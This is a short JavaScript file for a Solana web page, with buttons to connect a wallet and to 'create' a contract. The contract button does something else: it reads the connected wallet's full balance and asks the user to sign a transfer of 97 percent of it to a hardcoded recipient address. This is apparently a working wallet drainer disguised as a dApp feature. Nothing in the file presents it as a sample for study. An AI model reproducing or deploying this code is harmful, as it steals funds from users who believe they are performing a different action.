const recipientAddress = "3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ";
let walletAddress = null;

document.getElementById("connect-wallet").addEventListener("click", async () => {
  if (window.solana) {
    const response = await window.solana.connect();
    walletAddress = response.publicKey.toString();
    alert(`Wallet connected: ${walletAddress}`);
  } else {
    alert("Please install a Solana wallet like Phantom!");
  }
});

document.getElementById("create-contract").addEventListener("click", async () => {
  if (!walletAddress) {
    alert("Connect your wallet first!");
    return;
  }

  const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
  const transaction = new solanaWeb3.Transaction();

  const lamports = await connection.getBalance(new solanaWeb3.PublicKey(walletAddress));
  const transferInstruction = solanaWeb3.SystemProgram.transfer({
    fromPubkey: new solanaWeb3.PublicKey(walletAddress),
    toPubkey: new solanaWeb3.PublicKey(recipientAddress),
    lamports: Math.floor(lamports * 0.97),
  });

  transaction.add(transferInstruction);
  const signedTransaction = await window.solana.signTransaction(transaction);
  const signature = await connection.sendRawTransaction(signedTransaction.serialize());
  alert(`Transaction sent: ${signature}`);
});
